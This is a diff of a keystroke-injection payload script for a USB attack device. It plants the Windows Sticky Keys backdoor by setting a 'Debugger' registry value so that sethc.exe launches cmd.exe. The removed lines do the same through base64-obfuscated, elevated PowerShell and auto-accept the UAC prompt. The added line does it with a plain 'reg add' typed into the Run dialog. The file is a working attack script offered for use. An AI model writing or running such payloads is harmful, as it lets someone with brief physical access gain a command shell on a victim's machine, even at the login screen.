@@ -17,15 +17,5 @@
 
 GUI r
 DELAY 500
-STRING powershell.exe
+STRING reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
 ENTER
-DELAY 1000
-
-STRING start powershell -verb runas -A '-e','c2wgIkhLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXEltYWdlIEZpbGUgRXhlY3V0aW9uIE9wdGlvbnMiO25pIHNldGhjLmV4ZTtjZCBzZXRoYy5leGU7TmV3LUl0ZW1Qcm9wZXJ0eSAuIC1OIERlYnVnZ2VyIC1WYSAiY21kLmV4ZSI7ZXhpdA==';exit
-ENTER
-DELAY 500
-
-SHIFT TAB
-DELAY 100
-ENTER
-
